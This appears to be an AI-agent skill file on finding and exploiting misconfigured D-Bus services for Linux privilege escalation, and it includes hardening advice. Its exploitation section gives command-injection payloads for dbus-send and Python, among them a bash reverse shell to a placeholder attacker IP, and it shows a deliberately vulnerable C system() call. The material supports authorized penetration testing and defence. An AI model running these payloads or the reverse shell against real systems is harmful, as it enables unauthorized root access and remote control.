---
name: dbus-privilege-escalation
description: Enumerate and exploit D-Bus services for local privilege escalation on Linux systems. Use this skill whenever you need to find misconfigured D-Bus services, discover vulnerable methods, or exploit command injection in D-Bus interfaces during authorized security assessments, CTFs, or penetration testing. Trigger this skill for any D-Bus enumeration, service discovery, policy analysis, or exploitation tasks on Linux desktop environments.
---

# D-Bus Privilege Escalation

A skill for enumerating and exploiting D-Bus services to achieve local privilege escalation on Linux systems.

## When to Use This Skill

Use this skill when:
- You have low-privilege access to a Linux system and need to escalate to root
- You're performing authorized security assessments or CTF challenges
- You need to enumerate D-Bus services and their exposed methods
- You suspect misconfigured D-Bus policies or vulnerable services
- You want to analyze D-Bus policy files for security issues

## Prerequisites

- Low-privilege shell access to a Linux system with D-Bus installed
- Tools: `busctl`, `dbus-send`, `gdbus` (usually pre-installed on Ubuntu/Debian)
- Optional: `d-feet` for GUI enumeration (`sudo apt install d-feet`)
- **Authorization**: Only use on systems you own or have explicit permission to test

## Quick Start

```bash
# List all D-Bus services on the system bus
busctl list

# Get detailed info about a specific service
busctl status <service-name>

# View object tree for a service
busctl tree <service-name>

# Introspect a specific object path
busctl introspect <service-name> <object-path>
```

## Enumeration Workflow

### Step 1: List All Services

```bash
busctl list
```

Look for:
- Services running as **root** (UID=0 in the USER column)
- Services with **activatable** status (can be triggered)
- Unusual service names (not standard freedesktop.org services)

### Step 2: Analyze Service Details

For each interesting service:

```bash
# Get process info, capabilities, and permissions
busctl status <service-name>

# View the object tree structure
busctl tree <service-name>

# Introspect to see available methods
busctl introspect <service-name> <object-path>
```

Key indicators of potential vulnerabilities:
- **UID=0** or **EUID=0** (running as root)
- **EffectiveCapabilities** with dangerous caps (cap_sys_admin, cap_setuid, etc.)
- Methods with **string parameters** that might be passed to shell commands
- **SD_BUS_VTABLE_UNPRIVILEGED** flag (no authentication required)

### Step 3: Check Policy Files

```bash
# Search for overly permissive policies
grep -rE '<allow (own|send_destination|receive_sender)="\*"' /etc/dbus-1/system.d/ /usr/share/dbus-1/system.d/

# Find services allowing unprivileged users to send messages
grep -rB5 'send_destination' /etc/dbus-1/system.d/ | grep -A5 'user="[^root]"'
```

Look for:
- `send_destination="*"` (anyone can send to this service)
- `receive_sender="*"` (anyone can receive from this service)
- Policies allowing non-root users to interact with root-owned services

### Step 4: Monitor D-Bus Traffic (if root)

```bash
# Monitor a specific service
sudo busctl monitor <service-name>

# Monitor all system bus traffic
sudo busctl monitor

# Capture to pcap file for analysis
sudo busctl capture --output=/tmp/dbus_capture.pcap
```

## Exploitation Patterns

### Pattern 1: Command Injection via String Parameters

If a method accepts a string parameter and the service runs as root:

```bash
# Test with a simple command
dbus-send --system --print-reply \
  --dest=<service-name> \
  <object-path> \
  <interface>.<method> \
  string:';id;'

# If vulnerable, try reverse shell
dbus-send --system --print-reply \
  --dest=<service-name> \
  <object-path> \
  <interface>.<method> \
  string:';bash -c "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1";'
```

### Pattern 2: Python Exploitation

```python
#!/usr/bin/env python3
import dbus

# Connect to system bus
bus = dbus.SystemBus()

# Get the service object
service_object = bus.get_object('<service-name>', '<object-path>')

# Create interface
service_iface = dbus.Interface(
    service_object, 
    dbus_interface='<interface-name>'
)

# Send malicious payload
payload = ";id;"  # Test first
response = service_iface.<method_name>(payload)
print(response)

bus.close()
```

### Pattern 3: Using gdbus

```bash
# Call a method with gdbus
gdbus call -y \
  -d <service-name> \
  -o <object-path> \
  -m <interface>.<method> \
  "<payload>"
```

## Automated Enumeration Tools

### dbusmap ("Nmap for D-Bus")

```bash
# Install
git clone https://github.com/taviso/dbusmap
cd dbusmap && make

# List all services and methods
sudo ./dbus-map --dump-methods

# Probe for exploitable methods
sudo ./dbus-map --enable-probes --null-agent --dump-methods
```

### uptux.py

```bash
# Install
git clone https://github.com/initstring/uptux
cd uptux && pip install -r requirements.txt

# Run all checks
python3 uptux.py -n

# Verbose mode
python3 uptux.py -d
```

## Common Vulnerable Patterns

### 1. Unrestricted Policy Files

```xml
<!-- VULNERABLE: Allows any user to send to this service -->
<policy user="*">
    <allow send_destination="com.example.service"/>
</policy>

<!-- VULNERABLE: Allows any user to own this name -->
<policy user="*">
    <allow own="com.example.service"/>
</policy>
```

### 2. Missing Polkit Checks

Services that:
- Run as root on the system bus
- Accept string parameters
- Execute shell commands without validation
- Don't call `polkit_authority_check_authorization()`

### 3. Command Injection in C Code

```c
// VULNERABLE: Direct sprintf into system()
char command[] = "iptables -A PREROUTING -s %s -j DROP";
sprintf(command_buffer, command, user_input);
system(command_buffer);  // Command injection!
```

## Known CVEs to Watch

| CVE | Component | Vulnerability |
|-----|-----------|---------------|
| CVE-2024-45752 | logiops ≤ 0.3.4 | Unrestricted interface allows command injection |
| CVE-2025-23222 | dde-api-proxy ≤ 1.0.18 | Proxy forwards requests as UID 0 |
| CVE-2025-3931 | yggdrasil ≤ 0.4.6 | Public Dispatch method lacks ACLs |

## Hardening Recommendations

### For System Administrators

1. **Audit policy files**:
   ```bash
   grep -rE '<allow (own|send_destination|receive_sender)="\*"' /etc/dbus-1/
   ```

2. **Require Polkit for dangerous methods**:
   - Services should call `polkit_authority_check_authorization_sync()`
   - Pass caller PID, not service PID

3. **Drop privileges**:
   - Use `sd_pid_get_owner_uid()` to verify caller
   - Switch to unprivileged user after connecting to bus

4. **Scope services**:
   - Restrict to dedicated Unix groups
   - Use specific user policies instead of wildcards

### For Developers

1. **Never pass user input directly to system()**:
   ```c
   // BAD
   system(user_input);
   
   // GOOD
   execl("/bin/program", "program", validated_input, NULL);
   ```

2. **Validate all parameters**:
   - Whitelist allowed values
   - Sanitize string inputs
   - Use parameterized commands

3. **Implement proper authorization**:
   ```c
   polkit_authority_check_authorization_sync(
       authority, 
       context, 
       "com.example.action",
       details,
       POLKIT_CHECK_AUTHORIZATION_FLAGS_NONE,
       &result,
       &error
   );
   ```

## Safety Warnings

⚠️ **CRITICAL**: Only use these techniques on:
- Systems you own
- Systems with explicit written authorization
- CTF/CTF-style challenges
- Your own penetration testing engagements

⚠️ **Legal**: Unauthorized privilege escalation is illegal in most jurisdictions.

⚠️ **Stability**: Exploiting D-Bus services can crash the system or break functionality.

## References

- [D-Bus Specification](http://dbus.freedesktop.org/doc/dbus-specification.html)
- [busctl Manual](https://www.freedesktop.org/software/systemd/man/busctl.html)
- [Palo Alto Unit 42 - D-Bus Privilege Escalation](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [dbusmap GitHub](https://github.com/taviso/dbusmap)
- [uptux GitHub](https://github.com/initstring/uptux)
